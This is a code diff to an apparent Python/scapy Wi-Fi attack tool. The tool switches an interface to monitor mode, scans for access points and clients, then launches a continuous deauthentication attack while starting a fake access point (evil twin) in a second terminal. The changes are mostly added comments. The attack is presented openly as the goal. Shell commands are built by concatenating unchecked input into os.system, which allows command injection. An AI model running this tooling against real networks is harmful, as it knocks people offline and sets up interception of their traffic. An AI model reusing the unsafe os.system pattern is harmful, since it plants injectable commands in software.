@@ -5,23 +5,20 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
 ### Dot11 represent the MAC header, it is the abbreviated specification name 802.11
 ### Dot11Elt layers is where we put the necessary information: SSID, supported speeds (up to eight), additional supported speeds, channel used.
 ### Dot11Beacon represents an IEEE 802.11 Beacon
-
+# Reference to the scanning parts - https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
 
 # import json
-
-
-
 
 ap_list = []
 ### Coloum indices for 'ap_list'. 
 ESSID = 0
 BSSID = 1
 CHANNEL = 2
-
-client_list = []
 essids_set = set()
 
-  
+client_list = []
+
+
 ### Console colors
 W  = '\033[0m'  # white 
 R  = '\033[31m' # red
@@ -49,10 +46,11 @@ def monitor_mode():
     os.system('ifconfig')
     interface = input(G + "Please enter the interface name you want to put in 'monitor mode': ")
     print(W)
+    # Put the choosen interface in 'monitor mode'
     os.system('ifconfig ' + interface + ' down')
     os.system('iwconfig ' + interface + ' mode monitor')
     os.system('ifconfig ' + interface + ' up')
-    # os.system('iwconfig') #check
+    # os.system('iwconfig') # Check
 
 
 ### After we finish our attack, we want to switch back the interface to 'managed mode'. 
@@ -60,6 +58,7 @@ def managed_mode():
     print(G + "\n*** Step 5: Put the interface back in 'managed mode'. *** \n")
     empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........")
     print(W)
+    # Put the choosen interface back in 'managed mode'
     os.system('ifconfig ' + interface + ' down')
     os.system('iwconfig ' + interface + ' mode managed')
     os.system('ifconfig ' + interface + ' up')
@@ -92,6 +91,9 @@ def ap_scan():
     channel_changer.start()
     print("\n Scanning for networks...\n")
     # Sniffing packets - scanning the network for AP in the area
+    # iface – the interface that is in monitor mode
+    # prn – function to apply to each packet
+    # timeout – stop sniffing after a given time
     sniff(iface = interface, prn = ap_scan_pkt, timeout=search_timeout)
     num_of_ap = len(ap_list)
     # If at least one AP was found, print all the found APs
@@ -155,7 +157,7 @@ def set_channel(channel):
 
 
 ### sniff(..., prn = ap_scan_pkt, ...) 
-### The argument 'prn' allows us to pass a function that executes with each packet sniffed
+### The argument 'prn' allows us to pass a function to apply to each packet sniffed
 def ap_scan_pkt(pkt):
     # We are interested only in Beacon frame
     # Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN
@@ -260,14 +262,16 @@ def client_scan_pkt(pkt):
 ########## Deauthentication Attcak ###########
 ##############################################
 
-### In this fucntion we eventually ATTACK. YAY!
-### We send the deauthentication packets to the choosen AP and client. 
+### In this fucntion we ATTACK. YAY!
+### We send the deauthentication packets between the choosen AP and client. 
 def deauth_attack():
     print("\n*** Step 4: Disconnect the connection between the AP from the client. *** \n")
     print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
     empty = input ("Press Enter to start sending the Deauthentication packets.........")
     print(W)
+    # Open a new terminal for 'fake_ap.py'
     os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
+    # In the current terminal we will send non-stop deauthentication packets
     os.system('python3 deauth.py ' + client_mac + ' ' + ap_mac + ' ' + interface)
 
 
@@ -297,14 +301,7 @@ if __name__ == "__main__":
     ### Step 5: Put the interface back in managed mode  
     managed_mode()
     
-    ### Part 2: Set up & upload fake AP.
-    print(W)
-    # os.system('python3 second_part.py ' + ap_name) 
-    # os.system('gnome-terminal -- sh -c "python3 k1.py "' + z )
-    # run_second_part = "python3 second_part.py " + ap_name
-    # os.system('gnome-terminal -- sh -c "python3 second_part.py "' +  ap_name)
     
-
 
 
 
